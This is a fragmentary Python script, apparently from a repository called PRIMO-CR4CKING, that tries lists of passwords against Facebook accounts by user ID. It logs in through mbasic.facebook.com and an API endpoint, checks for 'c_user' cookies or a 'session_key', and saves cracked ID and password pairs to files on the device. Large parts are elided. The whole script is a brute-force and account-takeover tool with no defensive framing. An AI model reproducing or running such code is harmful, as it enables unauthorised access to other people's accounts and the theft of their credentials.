...
#Github : https://github.com/KLUEN-sketch/PRIMO-CR4CKING
from os import path
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [PRIMO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [PRIMO-ALIVE] %s | %s'%(ids,pas))
                                open(f'/sdcard/PRIMO-ALIVE.txt', 'a').write(ids+'|'+pas+'\n')
        ...
        try:
			...
			getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        ...
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [PRIMO-OK] %s | %s'%(ids,pas))
                                #cek_apk(session,coki)
                                open(f'/sdcard/PRIMO-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [PRIMO-ALIVE] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/PRIMO-ALIVE.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[PRIMO-ALIVE] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[PRIMO-DEAD] '+idf+' | '+ps+'\033[0;97m')
